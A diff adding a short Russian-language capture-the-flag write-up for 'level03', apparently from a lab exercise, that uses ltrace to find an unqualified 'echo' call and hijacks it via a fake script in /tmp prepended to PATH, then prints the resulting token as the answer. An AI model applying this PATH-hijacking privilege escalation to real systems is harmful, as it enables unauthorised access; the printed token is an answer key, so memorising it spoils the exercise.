@@ -1,0 +1,24 @@
+1) Видим файл level03, если его запустить ./level03 то получим:
+Exploit me. 
+
+2) Посмотрим, что вообще она вызывает: ltrace ./level03
+3) system("/usr/bin/env echo Exploit me"Check flag.Here is your token :  - интересна эта строка, т.к. вызывается echo из папки /usr/bin/env
+
+4) cd /tmp
+Возьмем папку tmp и создадим скрипт с таким же названием echo, но внутри укажем /bin/getflag& (посмотрели где находится getflag с помощью команды which getflag)
+
+5) chmod +x echo - добавим права на запуск
+
+6) Посмотрим, что в PATH:
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+7) Добавим нашу папку с нашим скриптом на первое место, тем самым подменим скрипт нашим.
+export "PATH=/tmp:$PATH"
+
+8) Получим:
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+
+9) ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+
+Ответ: qi0maab88jeaj46qoumi7maus
